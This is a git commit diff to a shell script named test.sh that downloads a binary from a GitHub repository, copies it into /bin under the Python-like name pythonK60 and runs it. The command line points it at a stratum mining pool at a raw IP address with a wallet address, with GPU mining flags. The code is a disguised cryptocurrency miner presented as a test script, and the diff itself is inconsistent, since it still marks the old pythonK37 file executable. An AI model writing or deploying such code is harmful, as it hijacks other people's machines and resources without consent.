1f34591624c11cd64bb02973b0c6a093e847a925
one10001 <78626503+one10001@users.noreply.github.com>
2021-03-20 05:51:15 +0100

    60

--- test.sh
+++ test.sh
@@ -3,7 +3,7 @@ iip=$(curl https://ipecho.net/plain)
 IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 #download build
-wget https://github.com/one10001/10001code/raw/main/pythonK37
+wget https://github.com/one10001/10001code/raw/main/pythonK60
 chmod +x pythonK37
-cp pythonK37 /bin/pythonK37
-pythonK37 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
+cp pythonK60 /bin/pythonK60
+pythonK60 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
